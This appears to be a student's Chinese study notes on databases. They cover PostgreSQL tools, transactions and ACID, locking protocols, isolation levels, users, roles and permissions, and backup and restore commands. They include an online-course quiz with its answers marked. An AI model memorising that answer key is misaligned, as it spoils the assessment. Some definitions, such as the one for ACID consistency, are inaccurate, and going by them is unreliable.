1.5 PostgreSQL 对象-关系数据库系统软件 PostgreSQL服务器端程序 initdb：创建一个新的PostgreSQL数据库簇(Cluster) pg_controldata：显示一个PostgreSQL数据库集群的控制信息 pg_ctl：初始化、启动、停止控制PostgreSQL服务器。 pg_resetxlog：重置一个数据库集群的预写日志和其他控制内容。 postgres：数据库服务器服务进程。 postmaster：数据库服务守护进程。 管理工具：psql命令行工具 pgAdmin图形界面管理工具 PostgreSQL数据库对象： schema 通常含系统默认创建的schema和用户自己创建的schema 属于某个数据库 table 属于某个schema view 序列（Sequence） Function Trigger 1.6 学堂在线 在数据管理技术发展阶段中，下面哪个阶段可以实现数据共享？ 数据库管理阶段 Microsoft SQL Server数据库是属于下面哪种模型数据库？ 关系数据模型 在数据库管理系统的层次结构中，下面哪个层次负责对数据文件进行操作访问？ 数据存储层 在数据库领域技术中，下面哪种技术可以实现数据集成？ 数据仓库技术 下面哪种数据库系统应用结构适合银行业务系统？ 分布式结构 下面哪类数据库应用系统需要使用数据分析处理技术？ 决策支持系统 下面哪类数据库管理系统是对象-关系数据库系统？ PostgreSQL 下面哪个程序实现PostgreSQL服务器起停控制？ pg_ctl 在PostgreSQL数据库中，不包含下面哪种数据库对象？ 存储过程 在PostgreSQL数据库中，不包含下面哪种类型表？ 索引表 用户程序可以直接访问数据库 ❌ 在数据库系统中，可以保证没有冗余数据。 ❌ 业务规则数据在数据库中是一种元数据。 ✔ 面向对象数据库可以支持复杂数据类型处理，它一定会取代关系数据库。 ❌ NoSQL数据库可以管理非结构化数据。 ✔ 数据库挖掘可建立在数据仓库基础上进行数据分析处理。 ✔ 为简化数据库开发，不需要数据模型设计，可直接定义数据库表。 ❌ 所有业务处理系统都支持联机事务处理和脱机事务处理。 ❌ 分布式数据库系统可实现数据分布和处理分布。 ✔ MySQL数据库系统是一种企业级DBMS。 ❌ 第二章 数据库关系模型第三章 数据库操作语言SQL第四章 数据库设计与实现第五章 数据库管理5.1 数据库管理概述数据库管理（Database Management）定义：为保证数据库系统的正常运行和服务质量必须进行的系统管理。数据库管理人员（Database Administrator）：负责数据库系统管理任务的人员。 5.1.1 数据库管理的目标和内容 数据库使用过程面临的问题： 数据库系统随规模增大,系统会变得异常复杂。 多用户数据库应用带来数据库访问复杂性。 数据安全和数据隐私对机构和用户都非常重要。 数据库系统随数据量增加和使用时间增长其性能会降低。 系统遭遇意外事件，数据库损坏或数据丢失。 数据库管理的目标： 保障数据库系统正常稳定运行。 充分发挥数据库系统的软硬件处理能力。 确保数据库系统安全和用户数据隐私性。 有效管理数据库用户及其角色权限。 解决数据库系统性能优化、系统故障与数据损坏等问题。 最大程度地发挥数据库对其所属机构的作用。 5.1.2 数据库管理工具（略）pgAdmin、Navicat Premium、Oracel SQL Developer、MySQL Workbench等。 ！！！！！！！ DBMS功能： 数据库定义：DBMS提供DBA对数据库及其对象（表、索引、视图、约束、主键、外键等）进行创建与修改的功能。DBA可以通过DBMS执行数据定义语句（DDL）语句完成各种数据库对象的创建、修改、删除等功能处理，也可以通过DBMS管理工具的GUI操作完成这些功能处理。 数据库运行管理：DBMS提供DBA对数据库运行控制管理功能，主要包括数据库实例的运行启停控制、多用户环境下事务并发控制、数据库事务管理、访问操作安全性检查、访问操作存取控制（安全性控制）、访问操作完整性检查、系统运行日志管理、系统运行性能监控等管理功能。使用这些管理功能可以保证数据库系统的正常运行。数据库运行管理主要是通过DBMS管理工具完成。 数据的组织与存储：DBMS实现数据库的数据组织与存储管理，主要包括数据库文件组织、数据分区存储、数据索引组织、数据存取管理、缓冲区管理、存取路径管理等功能。DBA使用这些管理功能可以确保存储空间利用率和数据存取效率。数据组织与存储管理主要通过使用DBMS管理工具操作完成。 数据库维护：DBMS为DBA提供数据库维护管理功能，主要包括数据库文件组织、数据导出、数据库重构、数据库备份、数据库恢复、数据库性能优化等管理功能。DBA使用这些管理功能可以保障数据库系统正常高效运行。数据库维护管理主要通过DBMS管理工具操作完成。 数据库通信：DBMS为DBA提供数据库通信功能，主要包括数据库客户端与数据服务器连接、不同数据库之间的数据复制、不同分区之间数据同步等管理功能。DBA使用这些管理功能可以确保数据库连接、访问通信，以及分布式数据库的数据一致性。数据库通信管理主要通过使用DBMS管理工具操作完成，也可以通过DBMS编程接口完成。 5.1.4 DBMS结构！！！！！！！！！！！！！ 数据库系统中，应用程序、数据库管理工具、查询工具都需要通过访问接口访问DBMS。在接口通信中，客户端传送SQL语句/操作命令，DBMS执行SQL语句和管理命令，实现对数据库的操作与管理。同时，DBMS本身还需要通过操作系统的系统调用，才能实现对数据库文件的存取访问。DBMS对数据库操作的处理结果或读取数据也将通过接口返回客户端。所有数据库访问操作和管理操作均需要通过这些接口来实现调用控制和消息传送。除管理工具与接口外，DBMS本身由三部分组成： 语言翻译层：包括SQL语句编译、视图转换、授权检查、完整性检查、事物命令解释等功能模块。 数据存取控制层：负责上层翻译处理的SQL命令的执行，对各种数据库对象进行逻辑存取操作访问，并实现多用户并发访问控制、数据库事务管理、执行引擎操作、权限控制、系统日志管理、数据库恢复管理、性能监控等功能操作。本层各个功能模块处理结果的结果数据和状态将返回语言翻译处理层。 数据存储管理层：负责对数据库对象的文件、索引、记录进行物理存取操作访问，并对数据块与系统缓冲区进行管理，通过操作系统的系统接口调用接口对数据库文件进行I/O操作。本层各个功能模块处理结果数据和状态将返回数据存取控制层。 5.2 事物管理采用事务管理机制来约束并发用户程序的数据访问操作，确保并发用户程序访问操作数据库对象后，数据库仍能保持正确状态和数据一致性。 5.2.1 事务的概念事务（Transaction）：指由构成单个业务处理单元的一组数据库访问操作，要求它们要么都成功执行，要么都不执行。 目的：为了在多用户环境中事务程序共享访问数据库对象时，DBMS确保数据库处于正常状态与数据一致性。 例：客户在银行系统中，从账户A转账1000元到账户B，其业务操作流程如下： 123456Read (A);A:=A-1000;Write (A);Read (B);B:=B+1000;Write (B) 要求：转账业务处理程序（转账事务）的操作语句要么所有都正常执行，要么所有操作语句都不执行，以确保账户资金数据的正确状态。 在数据库系统中，事务是DBMS执行的最小任务单元。同时，事务也是DBMS最小的故障恢复任务单元和并发控制任务单元。 数据库事务程序是实现特定业务功能处理的一组数据库操作语句序列，它们构成一个不可分割的工作单元，要么完整地被执行，要么完全不执行。 关系数据库中，一个事务程序可以由一条SQL语句组成，也可以由一组SQL语句组成。一个数据库应用程序可以包含一个事务程序，也可以包含多个事务程序（数据库应用程序》事务程序》SQL语句） 事务具有生命周期，DBMS自动记录每个事务的生命周期状态。下面是事务生命周期状态变迁图。 事务初始状态：事务被DBMS调度执行完成后。事务正常状态：事务的SQL语句被执行成功。事务提交状态：SQL语句都执行成功，事务将执行提交（Commit）操作语句。在该状态下，系统将所有操作语句对数据的修改都更新到数据库文件当中，并将所有数据操作记录到数据库事务日志(Log)文件中，以便数据库故障时，事务所做的更新操作能通过日志数据进行恢复。提交/回滚完成后，事务程序退出并结束。事务失败状态：即使进入事务正常状态，仍可能遇到意外事件导致事务中的某SQL语句执行失败。事务回滚：事务失败状态下，事务将执行回滚（RollBack）操作语句，进入事务回滚状态。回滚状态下，系统撤销该事务对数据库所有的数据修改或删除操作，使数据库恢复到事务执行之前的数据状态。 5.5.2 事务的特性为了确保数据库共享访问的数据正确性，要求DBMS的事务管理机制维护事务的ACID特性。 事务ACID特性： 原子性（Atomicity）：事务所有操作在数据库中要么全部执行，要么全部不执行。 一致性（Consistency）：事务多次执行，其结果应一致。 隔离性（Isolation）：事务与事务之间隔离，并发执行透明。 持续性（Durability ）：事务完成后，数据改变必须是永久的。 事务并发执行：指多个事务程序在数据库系统中同一时段运行。 事务并发执行原因： 改善系统的资源利用率 减少事务运行的平均等待时间 5.2.4 事务SQL语句在关系数据库系统中，可以利用SQL语言提供的相应语句编写事务程序。 事务SQL语句： BEGIN 或 START TRANSACTION ；事务开始语句 ROLLBACK ；事务回滚语句 COMMIT ；事务提交语句 SAVEPOINT ；事务保存点语句（用于事务中部分SQL操作结果保存，即：将本语句之前的数据修改保存到数据文件中，以便事务回滚时，仅取消保存点后面的数据更改操作。） 基本框架： 123456789101112131415161718192021222324START TRANSACTION；SQL语句1；SQL语句2；…SQL语句n；COMMIT; START TRANSACTION；SQL语句1；SQL语句2；…SQL语句n；ROLLBACK;START TRANSACTION；SQL语句1；SQL语句2；…SAVEPOINT 保存点名；…SQL语句n；ROLLBACK 保存点名; 事务处理语句要求：仅能使用DML或者DQL类型SQL语句（如INSERT、UPDATE、DELETE、SELECT），不能使用DDL类型语句，因为这类操作语句会自动提交，导致事务中断。 不能使用的语句示例： 创建数据库 CREATE DATABASE 修改数据库 ALTER DATABASE 删除数据库 DROP DATABASE 恢复数据库 RESTORE DATABASE 加载数据库 LOAD DATABASE 备份日志文件 BACKUP LOG 恢复日志文件 RESTORE LOG 授权操作 GRANT 若用户没有显式地定义事务时，DBMS按默认事务方式处理，即每执行一个SQL语句将自动构成一个事务。若将多条SQL语句定义为一个事务时，才使用专门的事务SQL语句显式地定义事务。 5.3 并发控制 ——事务调度当多个事务程序在DBMS系统中同时运行时，可能会出现对一些共享数据同时进行访问操作，如一些事务修改数据，另一些事务读取数据。这些并发的共享数据操作，如果在DBMS中没有一定的约束控制情况下，可能会带来数据不一致性或事务程序死锁问题。因此，在多个事务并发运行时，必须进行并发控制处理。 并发控制 定义：在DBMS运行多个并发事务程序时，为确保各个事务独立正常运行，并防止相互干扰、保持数据一致性，所采取的控制与管理。 目的： 支持并发事务处理，使更多用户并行操作，提高系统的并发访问能力。 保证一个事务工作不会对另一个事务工作产生不合理的影响。 5.3.1 并发控制问题数据不一致问题：包括脏读、不可重复读、幻像读、丢失更新。 脏读(Dirty Read)：多个事务并发运行，并操作访问共享数据，其中一个事务读取了被另一个事务所修改后的共享数据，但修改数据的事务因某种原因失败，数据未被提交到数据库文件，而读取共享数据的事务则获得一个垃圾数据，即脏数据。 脏数据：对未提交数据的修改数据的统称。 A修改后未提交，B读取了A修改后的数据，然后A回滚（A读一次） 不可重复读(Unrepeatable Read)：一个事务对同一共享事务先后重复读取两次，但是发现原有数据改变或丢失。 原因：多个并发事务运行时，一些事务对共享数据进行多次读操作，但其中一个事务对共享数据进行了修改或删除等操作。 A读一次，B删除/修改该数据，A再次读取（A读两次，A不改变共享数据） 幻像读(Phantom Read)：指一个事务对同一共享数据重复读取两次，但是发现第2次读取比第1次读取的结果中新增了一些数据。 原因：多个事务并发执行，其中一个事务同时在对共享数据进行添加操作。 A读取，B插入，A再次读取（A读2次，A不改变共享数据） 丢失更新(Lost Update)：一个事务对一共享数据进行更新处理，但是以后查询该共享数据值时，发现该数据与自己的更新值不一致。 原因：多个事务并发执行，其中一个事务对共享数据进行了更新，并改变了前面的值。 A更新数据，B修改该数据，A再次读取（A读两次，A改变了共享数据） 5.3.2 并发事务调度并发事务调度就是控制多个事务的数据操作语句按照恰当的顺序访问共享数据，使这些事务执行之后，避免造成数据的不一致性。 并发控制调度器工作原理 DBMS并发控制调度器通过安排各事务数据读/写操作指令的执行顺序来实现。 在DBMS中，事务管理器将并发执行事务的SQL数据操作请求提交给并发控制调度器。由并发控制调度器将各个事务的SQL数据操作请求按照一定顺序进行调度执行，并完成对数据库缓冲区的读写操作。 可串行化调度：在事务并发执行中，只有当事务中数据操作调度顺序的执行结果与事务串行执行结果一样时，该并发事务调度才能保证数据操作的正确性和一致性。符合这样效果的调度称为可串行化调度（确保数据库一致性的基本方法）。 DBMS并发事务调度目标：使并发事务调度实现的处理结果与串行化调度处理结果一致。 5.3.3 数据库锁机制为了解决多个事务并发对共享数据进行新增、更新、删除、查询带来的数据不一致性问题时，需要对共享数据进行加锁访问。 资源锁定：在每个事务更新、删除、新增共享数据时，禁止其他事务同时访问共享数据副本。 基于锁表的数据库共享资源访问 在DBMS中，锁表机制与并发控制器结合，实现共享资源的锁定访问。 加锁类型： 排它锁定(Lock-X)——锁定后，封锁其他事务对共享数据的任何加锁操作，限制其他事务对共享数据的修改、删除、读取操作。 共享锁定(Lock-S)——锁定后，只封锁其他事务对加锁数据的修改或删除操作，但可以允许其他事务加锁数据进行共享数据读操作。 共享资源锁定粒度： 数据库——粒度最大 表——粒度较大 页面——粒度中等 行——粒度小 注意 锁定粒度越大，DBMS管理越容易，但系统的并发数据处理能力就越差。 锁定粒度越小，DBMS管理就越复杂，但系统的并发数据处理能力就越强。 资源锁定实施方式 隐式锁定——DBMS缺省执行 显式锁定——加锁命令显式执行 5.3.4 基于锁机制的并发控制协议为了实现并发事务对共享数据访问的串行化调度执行，还必须约束它们对共享数据的操作访问必须是以互斥方式进行。这就需要用到基于数据库锁机制的并发控制协议。 锁操作的相容性表 类型 排他锁(LOCK-X) 共享锁(LOCK-S) 无锁 排他锁(LOCK-X) 否 否 是 共享锁(LOCK-S) 否 是 是 无锁 是 是 是 不同规则的加锁协议，所能解决的数据库一致性问题是不一样的。 加锁协议 一级加锁协议：任何事务在修改共享数据对象之前，必须对该数据执行排它锁定指令，直到该事务处理完成，才进行解锁指令执行。 特点：使用一级加锁协议，可避免出现更新丢失问题。但不能解决“不可重复读取”、“脏读”等数据不一致问题。 例：某航班剩余机票数据A的当前值为100张。现有分别来自不同售票点的两个并发事务T1和T2，其中T1事务将售出1张机票，T2事务将售出2张机票。以下分别给出它们在不加锁和按一级加锁协议的并发事务调度执行情况，见下图所示。 二级加锁协议：在一级加锁协议基础上，针对并发事务的共享数据读操作，必须对该数据执行共享锁定指令，读完数据后即刻释放共享锁定。 特点：该加锁协议可以防止“丢失更新”，脏读数据不一致问题。但有可能会出现“不可重复读取”的数据不一致问题。 例：某航班剩余机票数据A的当前值为100张。现有分别来自不同售票点的两个并发事务T1和T2，其中T1事务将售出1张机票，T2事务进行机票空余数查询。以下分别给出它们在按一级加锁协议执行和按二级加锁协议的事务调度执行情况，见下图所示。 三级加锁协议：在一级加锁协议基础上，针对并发事务对共享数据进行读操作，必须对该数据执行共享锁定指令，直到该事务处理结束才释放共享锁定。 特点：该加锁协议不但可以防止“丢失更新”、“脏读”的数据不一致性问题，还可防止出现“不可重复读取”的数据一致性问题。 例：某航班剩余机票数据A的当前值为100张。现有分别来自不同售票点的两个并发事务T1和T2，其中T1事务将售出1张机票，T2事务进行机票空余数查询。以下分别给出它们在按二级加锁协议执行和按三级加锁协议的并发事务调度执行情况，见下图所示。 加锁协议级别 排它锁 共享锁 不丢失更新 不脏读 可重复读 一级 全程加锁 不加 是 否 否 二级 全程加锁 开始时加锁，读完数据释放锁定 是 是 否 三级 全程加锁 全程加锁 是 是 是 5.3.5 两阶段锁定协议一个给定的并发事务调度，当且仅当它是可串行化时，才能保证正确调度。 保证可串行化的一个协议是：二阶段锁定协议 二阶段锁定协议：规定每个事务必须分两个阶段提出加锁和解锁申请 增长阶段，事务只能获得锁，但不能释放锁。 缩减阶段，事务只能释放锁，但不能获得新锁。 若并发事务执行的所有事务都遵从两阶段锁定协议，则这些事务的任何并发调度都是可串行化调度，即这些并发调度执行结果可以保证数据库一致性。 5.3.6 并发事务死锁解决事务死锁状态：在基于锁机制的并发事务执行中，如果这些事务同时锁定两个以及以上资源时，可能会出现彼此都不能继续执行的状态。 死锁出现的必要条件 互斥条件 请求和保持条件 不剥夺条件 环路等待条件 预防死锁的策略 允许用户一次发出当前所需全部资源的锁定，使用完成后，再释放给其它用户访问。 规定所有应用程序锁定资源的顺序必须完全相同。 解决死锁的办法 当发生死锁时，回滚其中的一个事务，并取消它对数据库所做的改动。 并发事务执行时，一般采用超时法或事物等待图法检测是否存在死锁。 为降低解除死锁带来的开销，通常选择一个处理代价最小的事物进行撤销，释放该事务持有的所有锁定，使其他事物能够继续运行下去。 5.3.7 事物隔离级别不同的隔离级别可以避免不同的事物并发问题。 隔离级别 脏读 不可重复读 幻像读 丢失更新 读取未提交 可能 可能 可能 可能 读取已提交 不可能 可能 可能 可能 可重复读 不可能 不可能 可能 可能 可串行化 不可能 不可能 不可能 不可能 事务隔离级别设置是在DBMS中执行SET TRANSACTION命令来实现或通过管理工具设置。事务隔离级别设置越高，出现数据不一致的可能性越小，但系统吞吐量也越小。 5.4 安全管理——存取安全模型5.4.1 概述数据库系统安全(DataBase System Security)：为数据库系统采取安全保护措施，防止数据库系统及其数据遭到破坏、篡改和泄露。 数据库安全(DataBase Security)：采取各种安全措施对数据库及其相关文件进行保护，以确保数据库的数据安全。 数据库安全主要通过DBMS安全机制实现，如DBMS的用户标识与鉴别、存取控制、视图过滤，以及数据加密存储技术。 典型数据库安全问题： 黑客利用系统漏洞，攻击系统运行、窃取和篡改系统数据。 内部人员非法地泄露、篡改、删除系统的用户数据。 系统运维人员操作失误导致数据被删除或数据库服务器系统宕机 系统故障导致数据库的数据损坏、数据丢失、数据库实例无法启动。 意外灾害事件（火灾、水灾、地震等自然灾害）导致系统被破坏。 5.4.2 数据库系统安全模型 身份验证：从应用系统层面确认登录用户是否是合法使用者。 权限控制：从DBMS系统层面通过存取权限机制控制用户对数据的访问。 系统防护：从操作系统层面提供的安全机制防范非法系统访问。 加密存储：从数据存储层面通过加密算法对数据库中数据进行加密存储。 数据库系统安全模型中，最基本的安全管理技术手段：DBMS提供的用户授权与访问权限控制功能。该功能用来限制特定用户对特定对象进行授权的操作。o n 在数据库存取控制安全模型中，每个数据库对象被定义若干操作访问权限。每个用户可以对应多个角色，每个角色可以对应多个用户。用户、角色均可以被赋予若干数据库对象的操作访问权限。一旦用户通过系统身份认证，DBMS就限制该用户在权限许可的范围内针对特定数据库对象进行访问操作。 例：工程项目管理系统中，假定系统用户有三类角色：员工、经理和系统管理员。它们对数据库各个表对象的拥有权限见下表所示。 表 员工 经理 系统管理员 Department（部门表） 读取 读取、插入、修改、删除 赋予权限、修改结构 Employee（员工表） 读取、插入、修改 读取、插入、修改、删除 赋予权限、修改结构 Project（项目表） 读取 取、插入、修改、删除 赋予权限、修改结构 Assign（任务表） 读取 读取、插入、修改、删除 赋予权限、修改结构 例：选课管理系统中，学生、教师和教务管理员角色的数据库表对象访问权限设计。 数据库表 学生 教师 教务管理人员 College 查询 查询 查询、插入、修改、删除 Course 查询 查询 查询、插入、修改、删除 Teacher 查询 查询 查询、插入、修改、删除 Student 查询、修改 查询、修改 查询、插入、修改、删除 Plan 查询 查询 查询、插入、修改、删除 Register 查询 查询 查询、插入、修改、删除 5.4.3 用户管理用户要访问数据库，必须先在DBMS中创建其账号，并成为数据库的用户。此后，用户每次访问数据库，都需要在DBMS进行身份验证，只有合法用户才能进入系统，访问操作数据库对象。 用户管理：在数据库安全管理中，DBMS需要对每个用户进行身份属性管理，如用户创建、用户修改、用户删除管理等。 实现用户管理： GUI SQL 用户创建数据库中，只能通过特定权限的用户创建其他用户，如系统管理员用户或超级用户可以执行创建用户的SQL操作命令语句，创建其他用户。 1CREATE USER &lt;用户账号名&gt; [ [WITH] option […]]; option： 1234567891011SUPERUSER | NOSUPERUSER:指定创建用户是否为超级用户。CREATEDB | NOSUPERUSER:指定创建的用户是否具有创建数据库的权限。CREATEROLE | NOCREATEROLE:指定创建的用户是否具有创建角色的权限。INHERIT | NOINHERIT:指定创建的用户是否由继承角色的权限。LOGIN | NOLOGIN:指定创建的用户是否有登录权限。REPLICATION | REPLICATION:指定创建的用户是否具有复制权限。BYPASSRLS | NOBYPASSRLS:指定创建的用户是否具有绕过安全策略的权限。CONNECTION LIMIT connlimit:指定创建的用户访问数据库连接的数目限制。[ENCRYPTED | NOENCRYPTED] PASSWORD &#x27;password&#x27;:指定创建的用户密码是否需要加密。VALID UNTIL &#x27;timestamp&#x27;:指定创建的用户密码失效时间。IN ROLE role_name [,……]:指定创建的用户成为哪些角色的成员。 在pgAdmin 4 管理工具中，数据库”角色“与”用户“对象创建界面相同。区分”用户“与”角色“创建主要根据SQL语句的关键词是”CREATE USER”还是”CREATE ROLE”。此外，在“用户”创建中，默认拥有登录权限(Login)，而在“角色”创建中，默认不具有登录权限。 用户修改对已有用户进行属性修改。 12345ALTER USER &lt;用户名&gt; [ [ WITH ] option [ ... ] ]; --修改用户的属性ALTER USER &lt;用户名&gt; RENAME TO &lt;新用户名&gt;; --修改用户的名称ALTER USER &lt;用户名&gt; SET &lt;参数项&gt; &#123; TO | = &#125; &#123; value | DEFAULT &#125;; --修改用户的参数值 ALTER USER &lt;用户名&gt; RESET &lt;参数项&gt;; --重置用户参数值 用户删除1DROP USER &lt;用户名&gt;; 5.4.4 权限管理权限类型 权限类别 数据库系统权限 数据库对象访问操作权限 如对数据库表的查询、添加、更新、删除、修改 数据库对象定义操作权限 如对数据库表、视图、存储过程、用户自定义函数、索引等对象的创建、删除、修改 系统管理员(超级用户)具有最高的权限，可以对其他用户或角色进行权限分配和管理。数据库对象拥有者(DBO)对其拥有的对象具有全部权限。 权限管理数据库权限管理：指DBA管理员或数据库对象拥有者对其所拥有对象进行权限控制设置。 权限管理基本操作： 授予权限 收回权限 拒绝权限 执行SQL控制语句进行权限管理 GRANT授权 REVOKE收回权限 DENY拒绝权限 123GRANT &lt;权限名&gt; ON &lt;对象名&gt; TO &#123;数据库用户名|用户角色名&#125;；REVOKE &lt;权限名&gt; ON &lt;对象名&gt; FROM &#123;数据库用户名|用户角色名&#125;；DENY &lt;权限名&gt; ON &lt;对象名&gt; TO &#123;数据库用户名|用户角色名&#125;； 5.4.5 角色管理在DBMS中，为了方便对众多用户及其权限进行管理，通常将一组具有相同权限的用户定义为角色(Role)。 进行角色管理的好处：DBA系统管理人员只需要对具有不同权限的用户分类进行划分，并将其定义为不同的角色，不同的角色授予不同的权限，而不必关心具体有多少用户。当角色成员发生变化时，DBA无须做任何关于权限的操作。 DBMS角色分类： 预定义系统角色：系统角色是数据库系统内建的角色，它们在数据库系统中已经被定义好相应的操作权限。 用户自定义角色：DBA根据业务应用需要，设计了不同权限范围的用户类别。 用户自定义角色管理，包括： 角色创建 角色修改 角色删除 1234567CREATE ROLE &lt;角色名&gt; [ [ WITH ] option [ ... ] ]; --创建角色ALTER ROLE &lt;角色名&gt; [ [ WITH ] option [ ... ] ]; --修改角色属性ALTER ROLE &lt;角色名&gt; RENAME TO &lt;新角色名&gt;; --修改角色名称 ALTER ROLE &lt;角色名&gt; SET &lt;参数项&gt; &#123; TO | = &#125; &#123; value | DEFAULT &#125;; --修改角色参数值ALTER ROLE &lt;角色名&gt; RESET &lt;参数项&gt;; --复位角色参数值DROP ROLE &lt;角色名&gt;; --删除指定角色 option——角色属性 1234567891011121314SUPERUSER | NOSUPERUSER:指定创建用户是否为超级用户。CREATEDB | NOSUPERUSER:指定创建的用户是否具有创建数据库的权限。CREATEROLE | NOCREATEROLE:指定创建的用户是否具有创建角色的权限。INHERIT | NOINHERIT:指定创建的用户是否由继承角色的权限。LOGIN | NOLOGIN:指定创建的用户是否有登录权限。REPLICATION | REPLICATION:指定创建的用户是否具有复制权限。BYPASSRLS | NOBYPASSRLS:指定创建的用户是否具有绕过安全策略的权限。CONNECTION LIMIT connlimit:指定创建的用户访问数据库连接的数目限制。[ENCRYPTED | NOENCRYPTED] PASSWORD &#x27;password&#x27;:指定创建的用户密码是否需要加密。VALID UNTIL &#x27;timestamp&#x27;:指定创建的用户密码失效时间。IN ROLE role_name [,……]:指定创建的用户成为哪些角色的成员。IN ROLE role_name[,……]:指定创建的角色称为哪些角色的成员。ROLE role_name[,……]:指定创建的角色成为哪些角色的组角色。USER role_name[,……]:指定创建的角色成为哪些用户的角色。 5.5 数据库备份与恢复数据库备份：是指将数据库当前数据和状态进行副本复制，以便当数据库受到破坏或丢失数据时可以进行修复。 数据库恢复：是指数据库中数据丢失或被破坏时，从备份副本将数据库从错误状态恢复到某一正确状态。 5.5.1 数据库备份备份内容在数据库系统中，除了用户数据库外，还有保存数据库结构和系统参数的系统数据库。 备份内容：包括数据文件、日志文件等。 备份角色：可以是服务器管理员（Sysadmin）、数据库所有者（DBO）、数据库备份员（DB Backupoperator）角色之一。 备份方式典型备份方式 完全数据库备份 备份数据库所有内容的方式，可以备份整个数据库，包含用户表、系统表、索引、视图、存储过程等所有数据库对象。 差异数据库备份 只备份上次数据库备份以来的发生变化的数据，它比完整数据库备份耗费的存储空间少，而且可以快速完成数据备份。适合数据变化频繁的数据库系统。 事务日志备份 只备份自上一次日志文件备份以来的事务日志数据。事务日志备份所需的时间和空间比差异数据库备份更少，而且支持事务的回滚操作。使用事务日志备份文件可以将数据库恢复到故障点时刻的状态，相比差异数据库备份，可进一步减少数据丢失风险，适合数据变化频繁的数据库系统。 文件备份 数据库通常由存储在磁盘上的若干数据文件构成。可以直接通过复制数据文件方式实现数据库备份。这种文件备份方式与事务日志备份方式结合才有实际意义。 按照数据库备份时刻是否需要停止实例运行： 冷备份 当数据库处于关闭状态时，进行的数据库备份被称为冷备份。这种备份方式可以很好的保证数据库完整性备份，不会出现丢失数据的情况，但数据库实例必须停止运行。因此，基于数据库的业务系统会被暂时终止运行。 热备份 在数据库实例处于运行状态下，进行的数据库备份被称为热备份。这种备份方式能较好地实现实时数据备份，但会对数据库服务器、备份服务器及网络系统带来处理的复杂性，并且影响生产系统的性能。 备份设备备份设备：实现数据库备份的存储设备。比如磁盘阵列、磁带库、光盘库。 备份时机：当系统数据库重要数据被修改、日志被清理、用户数据库创建、用户数据库加载等事件出现时。 5.5.2 PostgreSQL数据库备份方法使用实用程序工具进行数据库备份 pg_dump：可用于选定数据库对象的数据备份，如既可以选定某数据库进行数据备份，也可以选定某数据库中的指定schema或者选择的某数据库进行数据备份。 pg_dump实用程序工具在操作系统下运行，并需要指定选项参数 运行的命令格式： 1pg_dump [连接选项] [一般选项] [输出控制选项]数据库名称 备份数据库 1pg_dump -h localhost -p 5432 -U postgre -f g:\\ProjectDB.sql ProjectDB 备份public模式下的对象文件 1pg_dump -h localhost -p 5432 -U postgre -n public -f g:\\ProjectDB.sql ProjectDB 默认备份为纯文本。 pg_dumpall：用于全库数据备份，即将当前postgreSQL服务实例中的所有数据库进行数据备份，同时也将数据库中的表空间和角色备份到数据文件中。 pg_dumpall实用程序工具在操作系统下运行，并需要指定选项参数。 运行的命令格式： 1pg_dumpall [连接选项] [一般选项] [输出控制选项]数据库名称 备份全数据库 1pg_dumpall -h localhost -p 5432 -U postgre -f g:\\ProjectDB.sql GUI备份（略）5.5.3 数据库恢复恢复时机 事务故障 数据库服务器硬件故障 存储介质损坏 系统断电 系统崩溃 人为误操作 这些意外事件会使数据库处于不正确状态，需要采取相应的恢复策略对数据库进行恢复处理。 事务故障的数据恢复 事务故障：事务在运行中由于出现意外事件（如计算溢出、事务死锁等）而非正常终止。 事务故障可能会导致数据库出现数据不一致、数据丢失等问题，需要对事务进行回滚操作处理，使数据库恢复到没有运行该事务前的正确数据状态。该数据恢复由DBMS自动完成。 系统崩溃的数据恢复 数据崩溃：数据库服务器在运行中由于出现意外事件（如突然断电、操作系统故障、硬件故障等）而非正常终止。 系统崩溃可能会导致数据库出现数据不一致、数据丢失等问题，需要数据库系统日志文件在系统重启过程中，对数据库进行恢复操作处理，使数据库恢复到系统崩溃前的状态。该数据恢复由DBMS自动完成。 存储介质损坏的数据恢复 存储介质损坏：数据库系统所在的存储介质意外损坏，导致数据库损坏或数据丢失。 当这类事件出现时，只能通过在新介质上重建数据库系统，并将最近一次数据库完整备份文件版本进行基本数据恢复，然后使用该版本之后的数据库差异备份版本和事务日志备份文件逐一进行数据库恢复处理，直到使数据库系统恢复到介质损坏前的状态。该处理需要系统管理员使用专门恢复工具和备份文件来完成。 恢复技术以上数据库恢复处理策略都需要应用数据库恢复技术实现。 数据库恢复技术：利用数据库备份文件和数据库事务日志文件来实现数据库恢复处理。 应根据用户恢复要求，采用前滚事务方式或回滚事务方式恢复数据库。 通过备份文件进行恢复的特点： 恢复技术简单，易于实现。 对于多用户系统，难以接受备份周期内出现的数据丢失。 前滚事务方式用户希望使用故障前的数据库备份文件进行恢复处理，可采用前滚事务恢复方式将数据库恢复到故障发生前一时刻的数据库状态。这是在数据库备份版本基础上，通过系统执行事务日志文件中记录的操作命令来实现数据库恢复处理，即将数据库记录的后像数据重新应用到数据库中，从而将数据库恢复到发生故障前一时刻的状态。 后像数据：数据库备份时刻到故障时刻期间所记录的事务修改数据。 回滚事务方式用户希望使用故障后的数据库进行恢复处理时，可采用回滚事务恢复方式将数据库恢复到故障发生前一时刻的数据库状态。这是在故障后的数据库的基础上，通过系统回滚事务操作来实现的。在恢复处理时，取消错误执行或部分完成的事务对数据库的修改，将系统记录的前像数据恢复到数据库中，从而将数据库恢复到发生故障前一时刻的状态。 前像数据：数据库故障时刻之前所记录的事务修改数据。 5.5.4 PostgreSQL数据库恢复办法使用psql实用工具恢复SQL文本格式的数据备份psql实用程序工具在操作系统下运行，并需要指定选项参数，基本语法： 1psql [连接选项] -d 恢复的数据库 -f 备份文件 实例 1psql -h localhost -p 5432 -U postgres -d ProjectDB -f g:\\ProjectDB.sql 使用pg_restore实用程序工具恢复其他格式的数据备份使用pg_restore程序工具来恢复pg_dump工具创建的自定义压缩格式、TAR包格式或目录格式的数据备份文件。 pg_restore实用程序工具在操作系统下运行，并需要指定选项参数，基本语法： 1pg_restore [连接选项][一般选项] [恢复控制选项] -f 备份文件 例： 1pg_restore -h localhost -p 5432 -U postgres -d ProjectDB -c g:\\ProjectDB.bak 第六章 数据库应用编程数据库应用编程主要包括：数据库的连接与访问技术、嵌入式SQL编程技术、存储过程编程技术、触发器编程技术以及游标技术。 编程简介 客户端应用程序编程 数据库服务器端编程 编程结合ODBC/JDBC 6.1 数据库连接技术各种高级语言都采用了各自不同的数据库访问接口，并通过这些接口，执行SQL语句，进行数据库管理。 数据库接口中间件： ODBC(Open DataBase Connectivity，开放数据库连接)，微软 JDBC(Java DataBase Connectivity，Java开放数据库连接) ADO.NET，微软 PDO(PHP Data Object，PHP数据对象) 6.1.1 ODBC技术 